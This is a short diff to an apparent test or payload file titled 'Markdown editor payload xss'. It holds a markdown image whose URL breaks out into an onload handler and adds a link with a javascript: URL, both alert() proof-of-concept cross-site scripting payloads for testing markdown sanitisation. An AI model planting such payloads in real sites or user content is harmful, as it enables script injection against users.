@@ -1,3 +1,5 @@
 Markdown editor payload xss
 
 ![Uh oh...](https://www.example.com/image.png"onload="alert('XSS'))
+
+[Click Me](javascript:alert('test')
